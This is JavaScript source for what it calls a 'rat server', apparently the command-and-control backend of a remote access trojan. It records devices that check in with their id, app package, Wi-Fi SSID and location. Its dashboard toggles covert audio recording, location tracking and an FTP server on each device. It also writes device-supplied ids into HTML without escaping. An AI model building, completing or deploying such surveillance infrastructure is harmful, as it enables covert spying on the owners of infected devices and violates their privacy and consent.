/*
 * rat server
 *
 */

var express = require('express');
var mongoose = require('mongoose');
var morgan = require('morgan');
var jade = require('jade');

var app = express();
var PORT_NUMBER = process.argv[2]; // to start: "node server.js [port]"

// connect to the database
// mongoose.connect('mongodb://localhost/dagstaatje-database');
// var Dagstaat = require('./schemas/dagstaat');
//
// TODO list all connections
// have actions next to each one to turn on and off stuff
//

app.use(morgan(':date[clf] :remote-addr :method :url :res[content-length] - :response-time ms'));

app.post('/handshake/:id/:version/:package/:ssid/:isAudioStarted/:isLocationStarted/:ftpServerStarted/:location',
		function(req, res) {
			// morgan.log(req.params.id);
			// morgan.log(req.params.version);
			// morgan.log(req.params.package);
			// morgan.log(req.params.ssid);
			// morgan.log(req.params.isAudioStarted);
			// morgan.log(req.params.isLocationStarted);

			// TODO html dashboard where we can edit actions per connection
			//
			var actions = {
				startAudio    : false,
				startLocation : false,
				startFTPServer: false
			};

			connectionManager.add(req.params.id, req.params.isLocationStarted,
					req.params.isAudioStarted, req.params.ftpServerStarted);

			res.send(actions);
		});

app.get('/dashboard', function(req, res) {
	var head = "<html> <head> </head> <body> ";
	var content = "";
	var connections = connectionManager.connections;
	for(var i = 0; i < connections.length; i++) {
		// first link to detail view
		content += "\r\n<p><a href=\"";
		content += "/detailView/";
		content += connections[i].id;
		content += "\">";
		content += connections[i].id;
		content += " " + connections[i].age;
		content += "</a>";
		// link to start stop location
		content += " " + "location: ";
		content += "<a href=\""
		content += "/toggleLocation/";
		content += connections[i].id;
		content += "\">";
		content += " " + connections[i].location;
		content += "</a>";
		// link to start stop audio
		content += " " + "audio: ";
		content += "<a href=\""
		content += "/toggleAudio/";
		content += connections[i].id;
		content += "\">";
		content += " " + connections[i].audio;
		content += "</a>";
		// link to start stop ftp server
		content += " " + "ftpServer: ";
		content += "<a href=\""
		content += "/toggleFtpServer/";
		content += connections[i].id;
		content += "\">";
		content += " " + connections[i].ftpServ;
	}
	var foot = "\r\n</body> </html>";
	var page = head + content + foot;
	res.send(page);
});

app.get('/detailView/:id', function (req, res) {
	var head = "<html> <head> </head> <body> ";
	var connection = connectionManager.getOneById(req.params.id);
	var content = connection;
	var foot = "\r\n</body> </html>";
	var page = head + content + foot;
	res.send(page);
});

app.get('/toggleFtpServer/:id', function (req, res) {
	var connection = connectionManager.getOneById(req.params.id);
	if(connection.ftpServ === false){
		connection.ftpServ = true;
	} else {
		connection.ftpServ = false;
	}
	res.redirect('/dashboard');
});

app.get('/toggleLocation/:id', function (req, res) {
	var connection = connectionManager.getOneById(req.params.id);
	if(connection.location === false){
		connection.location = true;
	} else {
		connection.location = false;
	}
	res.redirect('/dashboard');
});

app.get('/toggleAudio/:id', function (req, res) {
	var connection = connectionManager.getOneById(req.params.id);
	if(connection.audio === false){
		connection.audio = true;
	} else {
		connection.audio = false;
	}
	res.redirect('/dashboard');
});

var connectionManager = {
	connections: [],
	add: function(id, location, audio, ftpServ){
		this.connections.push( {
			id: id,
			age: Date.now(),
			location: location,
			audio: audio,
			ftpServ: ftpServ
		});
		this.clean();
	},
	clean: function(){
		var timeout = 60000;
		for(var conn in this.connections){
			if(this.connections[conn].age < (Date.now() - timeout)){
				var index = this.connections.indexOf(this.connections[conn]);
				this.connections.splice(index, 1);
			}
		}
	},
	getOneById: function(id){
		for(var conn in this.connections){
			console.log("searching: " + this.connections[conn]);
			if(this.connections[conn].id === id) {
				return this.connections[conn];
			}
		}
	}
}

// start the server
var server = app.listen(PORT_NUMBER, function () {
	var host = server.address().address;
	var port = server.address().port;

	console.log('listening at %s:%s', host, port);
});

